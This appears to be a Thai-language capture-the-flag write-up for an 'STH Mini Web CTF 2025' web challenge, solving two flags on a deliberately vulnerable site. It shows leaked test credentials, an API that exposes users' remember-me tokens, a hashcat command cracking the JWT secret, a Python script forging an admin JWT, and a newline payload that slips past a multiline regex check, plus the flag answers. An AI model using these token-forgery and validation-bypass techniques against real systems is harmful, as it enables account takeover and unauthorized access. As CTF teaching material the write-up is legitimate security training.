---
title: STH Mini Web CTF 2025 ครั้งที่ 1 🔒💻
published: 2025-03-27
tags: ["CTF"]
category: Challenge CTF
image: ./img.jpg
draft: false
---

# 🕵️‍♂️ เจาะระบบเว็บโจทย์การแข่งขัน CTF

🔗 **เว็บไซต์โจทย์:** [https://web1.ctf.p7z.pw/](https://web1.ctf.p7z.pw/)

🎯 **เป้าหมาย:**
- ค้นหา Flag รูปแบบ `STH1{...}`
- เข้าสู่ระบบด้วยสิทธิ์ผู้ดูแลระบบ (Flag 1)
- พิมพ์เงินออกจากระบบ (Flag 2)

## 🚩 Flag 1: เข้าสู่ระบบผู้ดูแลระบบ

### 🔍 1. สำรวจหน้าเว็บ

เข้าสู่ [https://web1.ctf.p7z.pw/](https://web1.ctf.p7z.pw/) และตรวจสอบ `View Page Source` พบข้อมูล Credentials ในคอมเมนต์:


![ภาพที่ 1 แสดงคอมเมนต์ใน Source Code](./img/img1.png)

**Credentials ที่พบ:**

  - Username: `test`
  - Password: `test`

ใช้ Credentials เหล่านี้เพื่อเข้าสู่ระบบ

-----

### 🔍 2. ตรวจสอบ API และข้อมูลเพิ่มเติม

หลังเข้าสู่ระบบ ระบบนำไปยัง `https://web1.ctf.p7z.pw/userinfo.php` ซึ่งแสดงข้อมูลผู้ใช้

![ภาพที่ 0 แสดงหน้า User Info](./img/img0.png)

ตรวจสอบ `View Page Source` อีกครั้ง พบการโหลดไฟล์ `script.js`:

![ภาพที่ 2 แสดงการโหลดไฟล์ script.js ใน Source Code](./img/img2.png)

เนื้อหาใน `script.js` เกี่ยวข้องกับการดึงข้อมูลผู้ใช้ผ่าน API:

```javascript
// เอาไว้ดึงข้อมูล user ที่ login ปกติ
document.addEventListener('DOMContentLoaded', () => {
  // Fetch the current user's information from the API
  fetch('api.php?action=get_userinfo')
    .then(response => response.json())
    .then(data => {
      if (data.username) {
        // Populate the page with user info
        document.getElementById('username').textContent = data.username;
        document.getElementById('role').textContent = data.role;
        document.getElementById('status').textContent = data.status;
      } else if (data.error) {
        console.error('API Error:', data.error);
      } else {
        console.error('Unexpected response format.');
      }
    })
    .catch(err => {
      console.error('Error fetching user info:', err);
    });
});

// เอาไว้ดูข้อมูลตาม user ที่กรอกไป user={username}
function debugFetchUserTest() {
  fetch('api.php?action=get_userinfo&user=test')
    .then(response => response.json())
    .then(data => {
      console.log('Debug get_userinfo for user=test:', data);
    })
    .catch(err => {
      console.error('Error in debugFetchUserTest:', err);
    });
}

// เอาไว้ดู username ของทั้งหมดที่มีในระบบ
function debugFetchAllUsers() {
  // admin.php
  fetch('api.php?action=get_alluser')
    .then(response => response.json())
    .then(data => {
      console.log('Debug get_alluser result:', data);
    })
    .catch(err => {
      console.error('Error in debugFetchAllUsers:', err);
    });
}
```

-----

### 🔎 3. ค้นหา Username ทั้งหมด

เรียกใช้งาน API `get_alluser`:

🔗 **URL:** [https://web1.ctf.p7z.pw/api.php?action=get\_alluser](https://web1.ctf.p7z.pw/api.php?action=get_alluser)

**ผลลัพธ์:**

```json
[
  "test",
  "admin-uat"
]
```

พบ Username `admin-uat` ที่น่าจะเป็นผู้ดูแลระบบ

-----

### 🔑 4. ดึงข้อมูลผู้ใช้

ทดสอบเรียก API `get_userinfo` สำหรับแต่ละผู้ใช้:

#### 🔹 ผู้ใช้ `test`

🔗 **URL:** [https://web1.ctf.p7z.pw/api.php?action=get\_userinfo\&user=test](https://web1.ctf.p7z.pw/api.php?action=get_userinfo&user=test)

**ผลลัพธ์:**

```json
{
  "username": "test",
  "role": "user",
  "remember_me_token": "b81943ba-d1c5-495a-8427-4711c39256bf",
  "status": "Novice scammer, successfully conned 3 victims."
}
```

#### 🔹 ผู้ใช้ `admin-uat`

🔗 **URL:** [https://web1.ctf.p7z.pw/api.php?action=get\_userinfo\&user=admin-uat](https://web1.ctf.p7z.pw/api.php?action=get_userinfo&user=admin-uat)

**ผลลัพธ์:**

```json
{
  "username": "admin-uat",
  "role": "admin",
  "remember_me_token": "73eb7063-f8c3-4e50-bea2-07c05681aa92",
  "status": "Gang boss, oversees all operations."
}
```

-----

### 🏴 5. ยกระดับสิทธิ์ด้วย JWT Token

เมื่อกด **Remember Me** ระบบตั้งค่า Cookie `remember_me` ด้วย JWT:

```bash
remember_me = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6ImI4MTk0M2JhLWQxYzUtNDk1YS04NDI3LTQ3MTFjMzkyNTZiZiJ9.Rlk_a69lx16hNhwn4nBfRxhiMGmEDoPIcxfr1_7JdH8
```

Decode JWT ที่ [jwt.io](https://jwt.io/):

![ภาพที่ 3 แสดงการ Decode JWT บน jwt.io](./img/img3.png)

**Header:**

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload:**

```json
{
  "token": "b81943ba-d1c5-495a-8427-4711c39256bf"
}
```

Payload มีค่า `remember_me_token` ของ `user: test` ที่ถูกเข้ารหัสด้วย JWT

**เป้าหมาย:** ค้นหา **Secret Key** ที่ใช้เข้ารหัส เพื่อสร้าง JWT Token ใหม่สำหรับ `admin-uat`

ทำการ Brute Force **Secret Key** ของ `test` ด้วย `hashcat`:

```bash
hashcat -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6ImI4MTk0M2JhLWQxYzUtNDk1YS04NDI3LTQ3MTFjMzkyNTZiZiJ9.Rlk_a69lx16hNhwn4nBfRxhiMGmEDoPIcxfr1_7JdH8 rockyou.txt
```

**ผลลัพธ์:**

```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6ImI4MTk0M2JhLWQxYzUtNDk1YS04NDI3LTQ3MTFjMzkyNTZiZiJ9.Rlk_a69lx16hNhwn4nBfRxhiMGmEDoPIcxfr1_7JdH8:"bobcats"
```

พบ Secret Key: `"bobcats"`

ใช้ Python Script เพื่อเข้ารหัส `remember_me_token` ของ `admin-uat` ด้วย Secret Key ที่พบ:

```python
import jwt

payload = {"token": "73eb7063-f8c3-4e50-bea2-07c05681aa92"}
secret_key = "bobcats"

token = jwt.encode(
    payload,
    secret_key,
    headers={"alg": "HS256", "typ": "JWT"}
)

print("Token's admin-uat:", token)
```

**ผลลัพธ์:**

```bash
Token's admin-uat: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6IjczZWI3MDYzLWY4YzMtNGU1MC1iZWEyLTA3YzA1NjgxYWE5MiJ9.IFc2uZiX_3x1ihXgRaANOPvmySpQzFz_wMD0up8Ny0I
```

เปลี่ยนค่า Cookie `remember_me` ใน Browser เป็น Token ใหม่นี้ แล้วเข้าสู่ระบบ จะได้สิทธิ์ **admin**

![ภาพที่ 4 แสดงการแก้ไข Cookie ใน Browser](./img/img4.png)

หลังจากแก้ไข Cookie จะสามารถเข้าถึงหน้า Admin ได้:

![ภาพที่ 5 แสดงหน้า Admin](./img/img5.png)

เข้าสู่หน้า [https://web1.ctf.p7z.pw/admin.php](https://web1.ctf.p7z.pw/admin.php) และตรวจสอบ `View Page Source` พบ **Flag 1**:

```html

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Admin Panel - Money Printer</title>
  <!-- Bootstrap CSS (CDN) -->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
</head>
<body>
  <div class="container mt-5">
    <h3>Admin Money Printing Panel</h3>
    <div class="card mb-3">
      <div class="card-body">
        <!-- FLAG 1 is: STH1{310052ba6883872435f7c5aafa850813} -->                <!-- Print form -->
        <form method="POST">
          <div class="mb-3">
            <label for="amount" class="form-label">Number of notes to print</label>
            <input type="number" name="amount" id="amount" class="form-control" placeholder="e.g. 100">
          </div>
          <div class="mb-3">
            <label for="denomination" class="form-label">Denomination</label>
            <select name="denomination" id="denomination" class="form-control">
              <option value="USD">USD</option>
              <option value="EUR">EUR</option>
              <option value="GBP">GBP</option>
              <option value="SGD">SGD</option>
            </select>
          </div>
          <button type="submit" class="btn btn-primary">Print</button>
        </form>
      </div>
    </div>
    <!-- Logout button for admin -->
    <form action="logout.php" method="POST">
      <button type="submit" class="btn btn-danger">Logout</button>
    </form>
  </div>
  <footer class="text-center mt-4 mb-3">
  <hr>
  <p class="small mb-0">
    © 2025 
    <strong>Siam Thanat Hack Co., Ltd.</strong>
    All rights reserved.
  </p>
</footer>
<!-- 

function validateNumber($input) {
    if (preg_match('/^[0-9]+$/m', $input)) {
        return true;
    }
    return false;
}

$amount = $_POST['amount'] ?? '';
[...]

if(validateNumber($amount) && strpos($amount, 'STH') ){
    $outputMessage = "Printing $amount $denom ... Completed!<br>";
    $outputMessage .= "Serial Number: <strong>".$_ENV['FLAG2']."</strong>";

}else{
    $outputMessage = 'We need a number, but not a number';
}

 -->
</body>
</html>

```

**🚩 Flag 1:** `STH1{310052ba6883872435f7c5aafa850813}`

## 💸 Flag 2: พิมพ์เงินออกจากระบบ

จาก Source Code หน้า `admin.php` พบเงื่อนไขที่เกี่ยวข้องกับการพิมพ์เงิน:

```html
function validateNumber($input) {
    if (preg_match('/^[0-9]+$/m', $input)) {
        return true;
    }
    return false;
}

$amount = $_POST['amount'] ?? '';
[...]

if(validateNumber($amount) && strpos($amount, 'STH') ){
    $outputMessage = "Printing $amount $denom ... Completed!<br>";
    $outputMessage .= "Serial Number: <strong>".$_ENV['FLAG2']."</strong>";

}else{
    $outputMessage = 'We need a number, but not a number';
}
```

เงื่อนไขคือ `$amount` ต้อง:

1.  เป็นตัวเลขทั้งหมด (`validateNumber($amount)` คืนค่า `true` ผ่าน Regex `/^[0-9]+$/m`)
2.  มีสตริง `"STH"` อยู่ภายใน (`strpos($amount, 'STH')` คืนค่า `true`)

เนื่องจาก Regex `/^[0-9]+$/m` มี Modifier `/m` ทำให้ `^` และ `$` จับคู่กับจุดเริ่มต้นและจุดสิ้นสุดของแต่ละบรรทัด

**วิธีแก้:** ส่งค่า `$amount` ที่มีหลายบรรทัด โดย:

  - บรรทัดแรกเป็นตัวเลข
  - อีกบรรทัดมี `"STH"`

**Payload (ส่งแบบ POST ไปที่ https://web1.ctf.p7z.pw/admin.php):**

**Body:**

```
amount=123%0ASTH&denomination=USD
```

โดย `%0A` คือ Line Feed character (ขึ้นบรรทัดใหม่)

![ภาพที่ 6 แสดงการส่ง POST Request ด้วย Payload ที่สร้างขึ้น](./img/img6.png)

เมื่อส่ง Request นี้ จะทำให้เงื่อนไข `if(validateNumber($amount) && strpos($amount, 'STH') )` เป็นจริง และแสดง **Flag 2**

**🚩 Flag 2:** `STH2{d9d2532fd8ad5419450b5ea34ed93f32}`


## 🎉 Conclusion
- **Flag 1:** `STH1{310052ba6883872435f7c5aafa850813}`
- **Flag 2:** `STH2{d9d2532fd8ad5419450b5ea34ed93f32}`

🚀 **Challenge completed!** 🏆